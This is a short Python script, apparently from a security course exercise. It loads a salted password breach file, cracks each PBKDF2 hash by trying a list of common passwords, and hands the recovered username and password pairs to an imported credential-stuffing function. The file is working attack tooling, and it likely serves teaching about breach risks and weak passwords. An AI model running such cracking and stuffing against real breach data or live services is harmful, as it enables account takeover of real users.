from csv import reader
from app.util.hash import hash_sha256, hash_pbkdf2
from stuff import credential_stuffing_attack

COMMON_PASSWORDS_PATH = 'common_passwords.txt'
SALTED_BREACH_PATH = "app/scripts/breaches/salted_breach.csv"

def load_breach(fp):
    with open(fp) as f:
        r = reader(f, delimiter=' ')
        header = next(r)
        assert(header[0] == 'username')
        return list(r)

def load_common_passwords():
    with open(COMMON_PASSWORDS_PATH) as f:
        pws = list(reader(f))
    out = []
    for pw in pws:
        out.append(pw[0])

    return out

def brute_force_attack(target_hash, target_salt):
    passwords = load_common_passwords()

    for pwd in passwords:
        hashed = hash_pbkdf2(pwd, target_salt)
        if hashed == target_hash:
            return pwd
    return None

def main():
    salted_creds = load_breach(SALTED_BREACH_PATH)
    creds = []

    for name, salted_pwd, salt in salted_creds:
        pwd = brute_force_attack(salted_pwd, salt)
        if pwd:
            creds.append([name, pwd])
    credential_stuffing_attack(creds)


if __name__ == "__main__":
    main()